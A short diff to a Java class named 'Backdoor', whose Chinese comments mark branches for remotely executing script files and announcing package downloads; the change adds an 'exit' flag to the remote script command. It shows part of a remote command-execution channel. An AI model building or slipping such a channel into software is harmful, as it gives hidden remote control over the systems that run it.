@@ -114,7 +114,8 @@ public final class Backdoor {
 				// 远程执行脚本文件
 				final String command = buffer.readString();
 				final String inputs = buffer.readString();
-				return new ScriptCommand(dir, command, inputs);
+				final boolean exit = buffer.readBoolean();
+				return new ScriptCommand(dir, command, inputs, exit);
 			} else if (value == 0x01) {
 				// 通知文件包下载
 				final String name = buffer.readString();
